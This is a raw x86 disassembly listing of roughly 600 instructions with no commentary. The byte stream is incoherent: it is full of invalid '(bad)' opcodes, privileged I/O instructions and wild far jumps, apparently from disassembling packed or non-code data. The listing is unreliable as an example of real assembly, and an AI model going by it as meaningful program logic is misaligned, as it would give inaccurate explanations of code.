  41ca76:	xchg   DWORD PTR [edx+0x1cc60913],edi
  41ca7c:	shl    BYTE PTR [edx+eiz*8-0x38],1
  41ca80:	mov    edx,0xe8e8a343
  41ca85:	mov    al,0xbe
  41ca87:	mov    ds:0x630cc7df,al
  41ca8c:	mov    edx,0xfc24e005
  41ca91:	mov    DWORD PTR [eax-0x1a],ecx
  41ca94:	and    eax,0x2b85fcdb
  41ca99:	mov    edi,0xc0dddb77
  41ca9e:	jmp    0x14e5:0x996bce0
  41caa5:	pop    es
  41caa6:	ds inc eax
  41caa8:	fild   QWORD PTR [esi+0x1d]
  41caab:	je     0x41caf1
  41caad:	outs   dx,BYTE PTR ds:[esi]
  41caae:	loopne 0x41cae6
  41cab0:	sub    dh,bh
  41cab2:	cmp    BYTE PTR [edx-0x3edce4d6],ch
  41cab8:	dec    ebx
  41cab9:	dec    ebp
  41caba:	sbb    BYTE PTR [edx],ah
  41cabc:	xlat   BYTE PTR ds:[ebx]
  41cabd:	xor    al,BYTE PTR [edi-0x4d]
  41cac0:	sub    cl,dh
  41cac2:	fld    QWORD PTR ds:[esi+0x6]
  41cac6:	(bad)  [ebx]
  41cac8:	mov    WORD PTR [edi+0x576ae45d],gs
  41cace:	int3   
  41cacf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cad0:	(bad)  
  41cad1:	ret    0xfa65
  41cad4:	sar    BYTE PTR es:[esi-0xd2482bf],1
  41cadb:	and    dl,BYTE PTR [eax]
  41cadd:	fiadd  DWORD PTR [edi-0x1c]
  41cae0:	cmc    
  41cae1:	sbb    ah,dl
  41cae3:	xor    al,0x74
  41cae5:	stc    
  41cae6:	adc    dl,BYTE PTR [edi+esi*2]
  41cae9:	leave  
  41caea:	sub    cl,bh
  41caec:	fdiv   QWORD PTR [eax]
  41caee:	mov    WORD PTR [edx-0x2d71452a],ds
  41caf4:	mov    bh,0x3
  41caf6:	int    0x26
  41caf8:	jb     0x41cae5
  41cafa:	into   
  41cafb:	jo     0x41cb29
  41cafd:	sbb    esi,DWORD PTR [edx-0x62]
  41cb00:	jae    0x41caa8
  41cb02:	push   esi
  41cb03:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb05:	adc    eax,0x602a85d5
  41cb0a:	js     0x41caf8
  41cb0c:	mov    ebx,0x5eeb0c81
  41cb11:	icebp  
  41cb12:	jno    0x41cb79
  41cb14:	not    BYTE PTR [ebp-0x2c]
  41cb17:	mov    edx,0x1cdfabcb
  41cb1c:	or     eax,edi
  41cb1e:	sbb    BYTE PTR [edi],0xd9
  41cb21:	pop    ebx
  41cb22:	fnstsw WORD PTR [esi-0x74ac4fe4]
  41cb28:	fsub   DWORD PTR [eax+eiz*2+0x510a15ec]
  41cb2f:	test   al,0x7e
  41cb31:	xor    al,0xb3
  41cb33:	sbb    edx,DWORD PTR [edi]
  41cb35:	aam    0xc0
  41cb37:	and    ebx,eax
  41cb39:	xor    al,cl
  41cb3b:	int3   
  41cb3c:	xchg   DWORD PTR [esi-0x73cf6b35],ecx
  41cb42:	push   ebp
  41cb43:	mov    cl,0xd
  41cb45:	xchg   edi,eax
  41cb46:	or     ebx,DWORD PTR [ebx+0x5034708f]
  41cb4c:	gs ins DWORD PTR es:[edi],dx
  41cb4e:	pusha  
  41cb4f:	iret   
  41cb50:	pushf  
  41cb51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb52:	arpl   sp,dx
  41cb54:	cmp    edx,ebp
  41cb56:	mov    dl,BYTE PTR [ebp-0x2ae22a1d]
  41cb5c:	sbb    edi,DWORD PTR [esi+edi*2]
  41cb5f:	call   0x1b2f:0xc43c95f1
  41cb66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb67:	xchg   ebp,eax
  41cb68:	lods   al,BYTE PTR ds:[esi]
  41cb69:	xchg   edi,eax
  41cb6a:	mov    bh,0x26
  41cb6c:	dec    ebx
  41cb6d:	mov    eax,ds:0xc40afef0
  41cb72:	xchg   esp,eax
  41cb73:	loope  0x41cbf3
  41cb75:	sub    BYTE PTR [ecx],dh
  41cb77:	add    eax,0xe616c5f2
  41cb7c:	(bad)  
  41cb7d:	jecxz  0x41cba9
  41cb7f:	pop    edi
  41cb80:	scas   al,BYTE PTR es:[edi]
  41cb81:	les    esi,FWORD PTR [edx+0x3f4f1b76]
  41cb87:	pop    edi
  41cb88:	mov    esi,0xd7b21783
  41cb8d:	arpl   WORD PTR [edx-0x22],ax
  41cb90:	ret    
  41cb91:	jns    0x41cbb1
  41cb93:	fsubr  QWORD PTR [ecx+0x7e9a6703]
  41cb99:	xchg   ah,ah
  41cb9b:	fimul  WORD PTR [eax]
  41cb9d:	shl    dl,cl
  41cb9f:	test   esi,esi
  41cba1:	nop
  41cba2:	cmp    edi,DWORD PTR [ebx+0x32]
  41cba5:	fcmove st,st(7)
  41cba7:	mov    bl,dh
  41cba9:	(bad)  
  41cbaa:	cs call 0x552bbadb
  41cbb0:	jmp    0x11f1f0a5
  41cbb5:	aaa    
  41cbb6:	sub    ch,BYTE PTR [edx]
  41cbb8:	retf   
  41cbb9:	mov    ah,BYTE PTR [ecx+0x5994353f]
  41cbbf:	jl     0x41cbf0
  41cbc1:	push   esi
  41cbc2:	aad    0x1f
  41cbc4:	jns    0x41cbde
  41cbc6:	cmp    BYTE PTR [ecx+0x78],bl
  41cbc9:	popa   
  41cbca:	jg     0x41cba1
  41cbcc:	mov    al,ds:0xd095419b
  41cbd1:	mov    ecx,0x4a9b606b
  41cbd6:	sbb    al,0x55
  41cbd8:	sub    al,0xbf
  41cbda:	es cli 
  41cbdc:	or     al,dl
  41cbde:	frndint 
  41cbe0:	loopne 0x41cbb3
  41cbe2:	mov    ecx,0xcab232eb
  41cbe7:	cmp    dl,0x99
  41cbea:	sub    ebx,edx
  41cbec:	mov    bl,0x65
  41cbee:	(bad)  
  41cbef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbf0:	jns    0x41cc36
  41cbf2:	add    esi,0x4954051a
  41cbf8:	xchg   esp,eax
  41cbf9:	dec    esp
  41cbfa:	mov    ah,ah
  41cbfc:	cmp    ah,BYTE PTR [ecx-0x2c]
  41cbff:	jecxz  0x41cc4e
  41cc01:	adc    eax,0x4d323b95
  41cc06:	cdq    
  41cc07:	or     dl,dl
  41cc09:	mov    eax,ds:0x98e8f45c
  41cc0e:	cdq    
  41cc0f:	ins    DWORD PTR es:[edi],dx
  41cc10:	fwait
  41cc11:	cwde   
  41cc12:	xor    ebp,ecx
  41cc14:	xchg   ecx,eax
  41cc15:	add    DWORD PTR [esi+0x5c],esp
  41cc18:	adc    BYTE PTR [esi],ah
  41cc1a:	(bad)  
  41cc1b:	out    dx,al
  41cc1c:	jo     0x41cc5f
  41cc1e:	lods   eax,DWORD PTR ds:[esi]
  41cc1f:	mov    ah,0xda
  41cc21:	imul   DWORD PTR [edi-0x6]
  41cc24:	outs   dx,DWORD PTR ds:[esi]
  41cc25:	sub    eax,0x49b3f03c
  41cc2a:	sub    edx,ecx
  41cc2c:	mov    WORD PTR [eax-0x2f],cs
  41cc2f:	inc    edi
  41cc30:	aam    0x78
  41cc32:	(bad)  
  41cc33:	nop
  41cc34:	test   eax,0x16fa497f
  41cc39:	mov    eax,ds:0x245cec31
  41cc3e:	inc    ebp
  41cc3f:	outs   dx,BYTE PTR ds:[esi]
  41cc40:	lods   eax,DWORD PTR ds:[esi]
  41cc41:	ror    ebx,cl
  41cc43:	xchg   edi,eax
  41cc44:	xchg   DWORD PTR ds:0xffaaa6f5,ebp
  41cc4a:	clc    
  41cc4b:	xchg   edi,eax
  41cc4c:	fldcw  WORD PTR [ebp+0x4]
  41cc4f:	xlat   BYTE PTR ds:[ebx]
  41cc50:	les    esi,FWORD PTR [ebx]
  41cc52:	and    al,0xb5
  41cc54:	and    al,0x93
  41cc56:	push   ds
  41cc57:	inc    edi
  41cc58:	sbb    BYTE PTR [ecx-0x69],bh
  41cc5b:	(bad)  
  41cc5c:	mov    edi,0xb36dda23
  41cc61:	mov    DWORD PTR [ebx+0x4e],esi
  41cc64:	push   eax
  41cc65:	push   esp
  41cc66:	dec    ebx
  41cc67:	inc    esi
  41cc68:	lods   eax,DWORD PTR ds:[esi]
  41cc69:	cs pop ss
  41cc6b:	scas   al,BYTE PTR es:[edi]
  41cc6c:	mov    ecx,0x6771cd65
  41cc71:	push   edi
  41cc72:	sbb    eax,0x76a0ea4e
  41cc77:	js     0x41ccb9
  41cc79:	add    ch,BYTE PTR ds:0x9205d755
  41cc7f:	dec    edx
  41cc80:	mov    ebx,0x19f739a3
  41cc85:	xor    eax,0x6452d0cf
  41cc8a:	das    
  41cc8b:	(bad)  
  41cc8c:	retf   
  41cc8d:	dec    esi
  41cc8e:	xor    eax,DWORD PTR [eax-0x4a8eb925]
  41cc94:	cmp    BYTE PTR [ecx],dl
  41cc96:	sbb    esp,DWORD PTR [ebx+0xa]
  41cc99:	lods   al,BYTE PTR ds:[esi]
  41cc9a:	je     0x41cd17
  41cc9c:	jmp    0x73cf:0xf0971b45
  41cca3:	fisubr DWORD PTR [ebp+0x4beb704]
  41cca9:	into   
  41ccaa:	aad    0xfd
  41ccac:	aam    0x53
  41ccae:	jl     0x41ccc9
  41ccb0:	or     DWORD PTR [ebx],edi
  41ccb2:	dec    ecx
  41ccb3:	xchg   ebx,eax
  41ccb4:	pop    edx
  41ccb5:	sbb    DWORD PTR [ecx],ebp
  41ccb7:	adc    BYTE PTR [ecx],cl
  41ccb9:	xchg   esp,eax
  41ccba:	jb     0x41cd24
  41ccbc:	aad    0xb6
  41ccbe:	inc    ebp
  41ccbf:	sar    DWORD PTR [esi-0x66c883f7],cl
  41ccc5:	ja     0x41cc64
  41ccc7:	fcmovb st,st(2)
  41ccc9:	fwait
  41ccca:	mov    bl,0xc0
  41cccc:	push   eax
  41cccd:	sti    
  41ccce:	xor    eax,0xf8b8cce1
  41ccd3:	mov    bl,0xd7
  41ccd5:	pop    edi
  41ccd6:	pop    eax
  41ccd7:	ins    DWORD PTR es:[edi],dx
  41ccd8:	retf   
  41ccd9:	out    dx,eax
  41ccda:	popf   
  41ccdb:	adc    al,0xb
  41ccdd:	pop    ds
  41ccde:	lods   eax,DWORD PTR ds:[esi]
  41ccdf:	ret    0x514b
  41cce2:	in     al,dx
  41cce3:	in     al,dx
  41cce4:	fist   DWORD PTR [eax+0x7c5f0c2f]
  41ccea:	fmul   DWORD PTR [edx]
  41ccec:	into   
  41cced:	sbb    ah,dh
  41ccef:	dec    DWORD PTR [edi+0x164944ff]
  41ccf5:	xor    ecx,DWORD PTR [esi-0x61f35fa4]
  41ccfb:	xchg   BYTE PTR ds:0xfc667e02,bl
  41cd01:	sti    
  41cd02:	daa    
  41cd03:	sbb    edi,esp
  41cd05:	push   esp
  41cd06:	xor    ch,al
  41cd08:	inc    ebp
  41cd09:	jnp    0x41cd63
  41cd0b:	out    0xe0,eax
  41cd0d:	aam    0x66
  41cd0f:	loop   0x41ccda
  41cd11:	xchg   edx,eax
  41cd12:	pushf  
  41cd13:	adc    DWORD PTR [eax+0x61],ebp
  41cd16:	shl    BYTE PTR [edi+0xe2bf97a],1
  41cd1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd1d:	xor    ecx,ecx
  41cd1f:	mov    eax,ds:0x26017ba4
  41cd24:	arpl   cx,di
  41cd26:	xchg   edx,eax
  41cd27:	stos   BYTE PTR es:[edi],al
  41cd28:	in     al,0x9c
  41cd2a:	add    ebp,esp
  41cd2c:	arpl   si,si
  41cd2e:	mov    esi,0x2fb430e6
  41cd33:	stc    
  41cd34:	aaa    
  41cd35:	out    dx,eax
  41cd36:	loop   0x41cd43
  41cd38:	in     al,dx
  41cd39:	and    al,0x27
  41cd3b:	mov    WORD PTR [ebx-0x14],ds
  41cd3e:	lahf   
  41cd3f:	or     edi,DWORD PTR [esi+0xe]
  41cd42:	sub    bl,BYTE PTR [edx]
  41cd44:	fidiv  DWORD PTR [ebp-0x4a64b44b]
  41cd4a:	add    BYTE PTR [eax+0x56],dl
  41cd4d:	lea    edx,[edx+0x3fd9a1d]
  41cd53:	sahf   
  41cd54:	aad    0x94
  41cd56:	loop   0x41cd16
  41cd58:	sbb    eax,0xfddfb58
  41cd5d:	jmp    0x41cd3f
  41cd5f:	or     eax,0xd62ebe6d
  41cd64:	add    DWORD PTR [eax],ebx
  41cd66:	push   edx
  41cd67:	je     0x41cd19
  41cd69:	and    BYTE PTR [eax+edx*4+0x2a],0x79
  41cd6e:	pop    ebx
  41cd6f:	out    dx,eax
  41cd70:	test   BYTE PTR [edi+0x1b6f830b],0xeb
  41cd77:	scas   eax,DWORD PTR es:[edi]
  41cd78:	repz mov eax,ds:0x2d7e554f
  41cd7e:	xchg   edx,eax
  41cd7f:	mov    bl,0x36
  41cd81:	adc    DWORD PTR [edx],eax
  41cd83:	dec    edi
  41cd84:	jmp    0x41cd2d
  41cd86:	shl    DWORD PTR [ecx+eax*8-0x3b],1
  41cd8a:	xor    BYTE PTR [edx-0x6d3c66ce],al
  41cd90:	xchg   esp,eax
  41cd91:	(bad)  
  41cd92:	pop    ebx
  41cd93:	jg     0x41cdc3
  41cd95:	cdq    
  41cd96:	(bad)
  41cd99:	test   esp,0x4fd15c11
  41cd9f:	test   BYTE PTR [ebx+0x2fbd3d84],ch
  41cda5:	std    
  41cda6:	out    0xa3,al
  41cda8:	out    dx,al
  41cda9:	mov    edi,0x4829cbbe
  41cdae:	ror    dh,0x6e
  41cdb1:	xchg   BYTE PTR [ebx],ch
  41cdb3:	mov    al,0xaa
  41cdb5:	into   
  41cdb6:	cmp    DWORD PTR [edx],esi
  41cdb8:	ins    BYTE PTR es:[edi],dx
  41cdb9:	mov    cl,0x9f
  41cdbb:	adc    eax,0xb284e5a2
  41cdc0:	jmp    0xe24c:0x49dc53d2
  41cdc7:	inc    esp
  41cdc8:	mov    eax,0xcc5bcbc3
  41cdcd:	dec    ebx
  41cdce:	repz xchg ebp,eax
  41cdd0:	lahf   
  41cdd1:	imul   edi,DWORD PTR [ecx+0xe],0xf0fbcb23
  41cdd8:	jmp    0xe496:0xdb4e01f3
  41cddf:	lods   eax,DWORD PTR ds:[esi]
  41cde0:	cmp    eax,0x332d389d
  41cde5:	clc    
  41cde6:	jmp    0xf3984755
  41cdeb:	cli    
  41cdec:	xor    eax,0x85102af3
  41cdf1:	xor    eax,0x1218b623
  41cdf6:	mov    esp,0xaa5b88be
  41cdfb:	scas   eax,DWORD PTR es:[edi]
  41cdfc:	aaa    
  41cdfd:	add    esp,0x66947bb6
  41ce03:	sbb    DWORD PTR [edx-0x434b43ba],edi
  41ce09:	jae    0x41ce5f
  41ce0b:	mov    ebp,DWORD PTR ds:0xd59947c8
  41ce11:	movntps XMMWORD PTR ds:0x1dec793b,xmm0
  41ce18:	xor    BYTE PTR [ebp+0x16],0xf7
  41ce1c:	xlat   BYTE PTR ds:[ebx]
  41ce1d:	xchg   DWORD PTR [ebp-0x4a],eax
  41ce20:	fiadd  DWORD PTR [esi+0x7256f719]
  41ce26:	rcl    ecx,1
  41ce28:	cmc    
  41ce29:	add    al,ch
  41ce2b:	inc    ebx
  41ce2c:	sbb    bh,BYTE PTR [edi-0x26]
  41ce2f:	shr    DWORD PTR [ecx+eiz*8],cl
  41ce32:	inc    edx
  41ce33:	retf   
  41ce34:	adc    bh,BYTE PTR gs:[eax+0x1a1d7f46]
  41ce3b:	test   ebx,ecx
  41ce3d:	cmovns edi,eax
  41ce40:	out    0x42,al
  41ce42:	ins    DWORD PTR es:[edi],dx
  41ce43:	std    
  41ce44:	test   eax,0xb958cd31
  41ce49:	jbe    0x41ce1b
  41ce4b:	mov    ch,0x6
  41ce4d:	sbb    edx,ecx
  41ce4f:	out    dx,eax
  41ce50:	std    
  41ce51:	aad    0x4f
  41ce53:	xchg   ecx,eax
  41ce54:	and    DWORD PTR [edx],ecx
  41ce56:	mov    ch,0xac
  41ce58:	(bad)  
  41ce59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce5a:	stos   DWORD PTR es:[edi],eax
  41ce5b:	adc    ch,BYTE PTR [ecx]
  41ce5d:	mov    edi,gs
  41ce5f:	jo     0x41ce9c
  41ce61:	inc    ecx
  41ce62:	enter  0xabd9,0xe2
  41ce66:	and    BYTE PTR [eax],0xfc
  41ce69:	aad    0xe5
  41ce6b:	add    edi,DWORD PTR ds:0x2e30ee2
  41ce71:	mov    ebx,edx
  41ce73:	dec    esp
  41ce74:	jg     0x41ceba
  41ce76:	sar    DWORD PTR [edx-0xd0be3fc],1
  41ce7c:	sub    DWORD PTR [ecx-0x4ec46f4f],ebx
  41ce82:	sbb    DWORD PTR [eax],esi
  41ce84:	push   edi
  41ce85:	dec    esi
  41ce86:	xchg   ecx,eax
  41ce87:	pop    ebp
  41ce88:	clc    
  41ce89:	aaa    
  41ce8a:	scas   eax,DWORD PTR es:[edi]
  41ce8b:	mov    bl,0x16
  41ce8d:	sar    DWORD PTR [edx],cl
  41ce8f:	add    edx,DWORD PTR cs:0x9803d93e
  41ce96:	push   ecx
  41ce97:	inc    ecx
  41ce99:	pop    eax
  41ce9a:	inc    edx
  41ce9b:	sbb    eax,0xef27ae4d
  41cea0:	adc    al,0xc5
  41cea2:	fmulp  st(1),st
  41cea4:	and    bl,BYTE PTR [ecx]
  41cea6:	arpl   WORD PTR [ecx],di
  41cea8:	xchg   ebx,eax
  41cea9:	sbb    BYTE PTR [esi],bh
  41ceab:	mov    dh,0x12
  41cead:	and    eax,0xcf488029
  41ceb2:	cmp    al,0xab
  41ceb4:	or     DWORD PTR [eax-0x10],esi
  41ceb7:	mov    esi,0x141a9a8
  41cebc:	mov    ds:0x9ae6c51b,al
  41cec1:	sbb    DWORD PTR [ebx],0x76b23bbd
  41cec7:	sub    eax,ebx
  41cec9:	cld    
  41ceca:	adc    DWORD PTR [edx-0x65b51cbd],esi
  41ced0:	repnz nop
  41ced2:	sbb    BYTE PTR [ecx],cl
  41ced4:	jl     0x41cecf
  41ced6:	xchg   edx,eax
  41ced7:	pop    edi
  41ced8:	add    ah,al
  41ceda:	ret    0x6df0
  41cedd:	icebp  
  41cede:	mov    dh,0x9a
  41cee0:	or     cl,BYTE PTR [edx]
  41cee2:	mov    bh,0x14
  41cee4:	retf   0xc000
  41cee7:	xchg   esi,eax
  41cee8:	lods   al,BYTE PTR ds:[esi]
  41cee9:	lea    ebp,[ecx-0x3d313787]
  41ceef:	stos   BYTE PTR es:[edi],al
  41cef0:	mov    ecx,0x2482f9be
  41cef5:	fs cli 
  41cef7:	mov    ah,0xe3
  41cef9:	icebp  
  41cefa:	aad    0xe3
  41cefc:	dec    ecx
  41cefd:	cdq    
  41cefe:	ret    
  41ceff:	daa    
  41cf00:	adc    edi,DWORD PTR [ecx]
  41cf02:	(bad)  
  41cf04:	or     ebx,DWORD PTR [ecx+ebx*8+0x3f8414ee]
  41cf0b:	lods   al,BYTE PTR ds:[esi]
  41cf0c:	idiv   DWORD PTR [edx]
  41cf0e:	sbb    esi,DWORD PTR [esi+0x79]
  41cf11:	outs   dx,BYTE PTR ds:[esi]
  41cf12:	std    
  41cf13:	mov    dh,0xae
  41cf15:	push   ebp
  41cf16:	repz icebp 
  41cf18:	bound  ebx,QWORD PTR [edi-0x1813757e]
  41cf1e:	mov    WORD PTR [esi+0x19ee106a],?
  41cf24:	mov    ds:0x28378e32,eax
  41cf29:	mov    dh,0xca
  41cf2b:	pop    ecx
  41cf2c:	xor    al,0x53
  41cf2e:	jno    0x41cf3a
  41cf30:	test   al,0x88
  41cf32:	rcl    DWORD PTR [esi-0x75],cl
  41cf35:	inc    ebx
  41cf36:	js     0x41cf7b
  41cf38:	jne    0x41cece
  41cf3a:	add    BYTE PTR [ebx-0x35518c59],bh
  41cf40:	inc    edi
  41cf41:	push   ss
  41cf42:	shl    BYTE PTR [ebp-0x6d7d9e02],cl
  41cf48:	mov    esp,0x22ffa7b6
  41cf4d:	popa   
  41cf4e:	cmp    ch,BYTE PTR [edx+0x4b3fd706]
  41cf54:	vaddsubps xmm2,xmm7,XMMWORD PTR [ebp+0x7cfc76d2]
  41cf5c:	xchg   edx,eax
  41cf5d:	and    eax,DWORD PTR [esp+ebp*4-0x7c2a1e98]
  41cf64:	xlat   BYTE PTR ds:[ebx]
  41cf65:	hlt    
  41cf66:	icebp  
  41cf67:	fstp   QWORD PTR [eax-0x54fba533]
  41cf6d:	pop    esi
  41cf6e:	xchg   DWORD PTR [ecx+ecx*2+0x5b1d7255],esi
  41cf75:	pop    ss
  41cf76:	xchg   edi,eax
  41cf77:	pop    ecx
  41cf78:	repnz mov DWORD PTR [eax],edx
  41cf7b:	or     BYTE PTR [edi],al
  41cf7d:	jmp    0x41cf6b
  41cf7f:	pop    ecx
  41cf80:	iret   
  41cf81:	aam    0x11
  41cf83:	(bad)  
  41cf84:	push   ebp
  41cf85:	jo     0x41cfbb
  41cf87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf88:	or     BYTE PTR [eax],cl
  41cf8a:	adc    ebx,ebp
  41cf8c:	jae    0x41cf91
  41cf8e:	(bad)  
  41cf8f:	dec    esi
  41cf90:	jecxz  0x41cf22
  41cf92:	xchg   ebx,eax
  41cf93:	pusha  
  41cf94:	fild   QWORD PTR [edi+0x19f0a807]
  41cf9a:	clc    
  41cf9b:	ret    
  41cf9c:	sub    edi,DWORD PTR [ecx-0xe]
  41cf9f:	js     0x41cfa6
  41cfa1:	xchg   ebp,eax
  41cfa2:	inc    esi
  41cfa3:	xor    esp,DWORD PTR [ebx+0xaf2c879]
  41cfa9:	and    ecx,0xffffff84
  41cfac:	add    eax,0xeaaa518b
  41cfb1:	jns    0x41cfaf
  41cfb3:	push   edx
  41cfb4:	sbb    BYTE PTR [ebx+edi*8+0x27156d7e],bh
  41cfbb:	mov    bh,0x7b
  41cfbd:	xor    eax,0xd3c9633e
  41cfc2:	jmp    0x5c9c0d9a
  41cfc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfc8:	pop    ebp
  41cfc9:	jo     0x41cf5b
  41cfcb:	in     eax,0xf7
  41cfcd:	ffreep st(4)
  41cfcf:	popf   
  41cfd0:	jbe    0x41d01f
  41cfd2:	inc    esp
  41cfd3:	test   eax,0xa9a036b0
  41cfd8:	add    ah,BYTE PTR [ecx-0x64fd5021]
  41cfde:	cmp    DWORD PTR [eax-0x80],edx
  41cfe1:	jb     0x41cfc8
  41cfe3:	add    BYTE PTR [eax-0x566589e8],dh
  41cfe9:	mov    eax,0x459920c9
  41cfee:	ror    BYTE PTR [esi-0x4d81227d],0x13
  41cff5:	add    cl,bh
  41cff7:	ja     0x41cfe1
  41cff9:	xchg   edi,eax
  41cffa:	lock cli 
  41cffc:	rcr    BYTE PTR [edx-0x30],1
  41cfff:	mov    esp,0xf85b1e72
  41d004:	iret   
  41d005:	mov    cl,0xb9
  41d007:	jmp    0xd75a:0x27e55e8
  41d00e:	addr16 inc ebp
  41d010:	ror    BYTE PTR [ebx],1
  41d012:	xchg   esi,eax
  41d013:	cmp    BYTE PTR [ebx],ch
  41d015:	lods   eax,DWORD PTR ds:[esi]
  41d016:	fucomi st,st(4)
  41d018:	mov    ds:0xa118f207,al
  41d01d:	or     BYTE PTR [esi],bl
  41d01f:	xchg   dl,bl
  41d021:	mov    ah,0x45
  41d023:	ss inc ebx
  41d025:	sub    al,0xe8
  41d027:	mov    es,ebx
  41d029:	popa   
  41d02a:	mov    esp,0xebbffd87
  41d02f:	cdq    
  41d030:	test   BYTE PTR [edx],bl
  41d032:	xchg   DWORD PTR [edi+ecx*8+0x6a8237fd],esp
  41d039:	pop    ds
  41d03a:	ret    
  41d03b:	rcl    bl,0x53
  41d03e:	ds test eax,0xc821d939
  41d044:	mov    ch,0xec
  41d046:	dec    eax
  41d047:	and    bh,ch
  41d049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d04a:	dec    ecx
  41d04b:	fstp   TBYTE PTR [ebx+0x21]
  41d04e:	std    
  41d04f:	enter  0x8dae,0x35
  41d053:	div    DWORD PTR [esi-0x1fc6c257]
  41d059:	xlat   BYTE PTR ds:[ebx]
  41d05a:	retf   
  41d05b:	mov    esi,DWORD PTR [eax+0x50868d51]
  41d061:	inc    esi
  41d062:	mov    eax,ds:0x4c78d9fd
  41d067:	jmp    0x86e4:0xe102f405
  41d06e:	retf   0xbcb2
  41d071:	xchg   ebx,eax
  41d072:	dec    ebp
  41d073:	or     al,0xdd
  41d075:	fwait
  41d076:	aam    0xf
  41d078:	mov    ch,0x1d
  41d07a:	loope  0x41d098
  41d07c:	push   ds
  41d07d:	(bad)  
  41d07e:	mov    edx,0xc5516d9c
  41d083:	mov    eax,0x7c9e89d3
  41d088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d089:	push   cs
  41d08a:	pop    esp
  41d08b:	push   ecx
  41d08c:	mov    BYTE PTR [edi],dl
  41d08e:	dec    edi
  41d08f:	bound  esi,QWORD PTR [ebp+0x2dc21949]
  41d095:	fisttp DWORD PTR [edx-0x73]
  41d098:	cmp    al,0x23
  41d09a:	sub    dh,al
  41d09c:	test   al,0xeb
  41d09e:	adc    eax,DWORD PTR [esi+0x79]
  41d0a1:	bound  esp,QWORD PTR [edx]
  41d0a3:	je     0x41d0e4
  41d0a5:	scas   al,BYTE PTR es:[edi]
  41d0a6:	push   edx
  41d0a7:	xchg   esi,eax
  41d0a8:	mov    esi,0x26a4df9b
  41d0ad:	push   ecx
  41d0ae:	dec    ebx
  41d0af:	mov    fs,edi
  41d0b1:	add    al,0xd9
  41d0b3:	adc    ah,ch
  41d0b5:	cwde   
  41d0b6:	mov    esi,0x4ce6ea6c
  41d0bb:	push   esi
  41d0bc:	pop    esi
  41d0bd:	and    al,ch
  41d0bf:	inc    eax
  41d0c0:	outs   dx,DWORD PTR ds:[esi]
  41d0c1:	mov    cl,0xe5
  41d0c3:	scas   eax,DWORD PTR es:[edi]
  41d0c4:	bound  edx,QWORD PTR [edi]
  41d0c6:	inc    edi
  41d0c7:	inc    ecx
  41d0c8:	dec    ebp
  41d0c9:	call   DWORD PTR [ebp+edx*1+0x1f]
  41d0cd:	jno    0x41d14a
  41d0cf:	jns    0x41d0e2
  41d0d1:	enter  0x6b5b,0xbb
  41d0d5:	mov    dl,0x8e
  41d0d7:	xchg   edi,eax
  41d0d8:	mov    bl,0x80
  41d0da:	daa    
  41d0db:	jo     0x41d0b7
  41d0dd:	xchg   edi,eax
  41d0de:	and    DWORD PTR ds:0xfca85186,0x61
  41d0e5:	sbb    esp,DWORD PTR [ebx+0x2d]
  41d0e8:	int    0xb6
  41d0ea:	loop   0x41d071
  41d0ec:	dec    edx
  41d0ed:	push   0x64196649
  41d0f2:	mov    bl,0x7c
  41d0f4:	lods   al,BYTE PTR ds:[esi]
  41d0f5:	dec    esp
  41d0f6:	(bad)  
  41d0f7:	stos   DWORD PTR es:[edi],eax
  41d0f8:	add    al,al
  41d0fa:	jge    0x41d14e
  41d0fc:	aaa    
  41d0fd:	xor    eax,0x8971a410
  41d102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d103:	fstp   TBYTE PTR [ebx+edx*2]
  41d106:	sub    esp,DWORD PTR [esi-0x3c]
  41d109:	cmp    eax,0x18cb77e2
  41d10e:	icebp  
  41d10f:	data16 hlt 
  41d111:	mov    es,WORD PTR [esi]
  41d113:	pop    esp
  41d114:	jnp    0x41d13f
  41d116:	lahf   
  41d117:	stos   DWORD PTR es:[edi],eax
  41d118:	jmp    0xb03f359f
  41d11d:	int3   
  41d11e:	jp     0x41d15e
  41d120:	cmc    
  41d121:	sbb    al,0x1d
  41d123:	jecxz  0x41d0b3
  41d125:	mov    bl,0x7b
  41d127:	sub    BYTE PTR [edx-0x2cce494c],dl
  41d12d:	jns    0x41d140
  41d12f:	push   ds
  41d130:	sbb    esi,esi
  41d132:	add    DWORD PTR [esi+0x69],edx
  41d135:	test   al,0x86
  41d137:	sub    al,0xa2
  41d139:	xchg   ebp,eax
  41d13a:	xor    DWORD PTR [ebx+0x4e],esi
  41d13d:	jp     0x41d165
  41d13f:	sbb    bh,BYTE PTR [edi]
  41d141:	stos   DWORD PTR es:[edi],eax
  41d142:	dec    ebx
  41d143:	repnz xchg ebx,eax
  41d145:	xchg   BYTE PTR ds:0x5b498fe3,bh
  41d14b:	dec    esp
  41d14c:	pop    eax
  41d14d:	iret   
  41d14e:	iret   
  41d14f:	call   0xb4a96cfd
  41d154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d155:	fnstcw WORD PTR [edx+edi*4]
  41d158:	jecxz  0x41d128
  41d15a:	pushf  
  41d15b:	mov    ah,0x26
  41d15d:	push   es
  41d15e:	push   esi
  41d15f:	popf   
  41d160:	out    0xa4,al
  41d162:	push   es
  41d163:	jle    0x41d13c
  41d165:	out    0x50,al
  41d167:	mov    ebp,0x836f9dde
  41d16c:	sub    al,BYTE PTR [edi+0x51]
  41d16f:	xchg   ebx,eax
  41d170:	and    al,0x29
  41d172:	ss pusha 
  41d174:	xor    al,0x6b
  41d176:	dec    ebx
  41d177:	std    
  41d178:	test   al,0xd0
  41d17a:	dec    edi
  41d17b:	xlat   BYTE PTR ds:[ebx]
  41d17c:	test   eax,0x9d2553f
  41d181:	int3   
  41d182:	fdivr  QWORD PTR [ecx]
  41d184:	or     al,0x28
  41d186:	mov    DWORD PTR [esi-0xb1b31c2],0x67f12a57
  41d190:	pop    ecx
  41d191:	cwde   
  41d192:	sub    bl,BYTE PTR [eax+0x168319f8]
  41d198:	cld    
  41d199:	test   eax,0x9233ed14
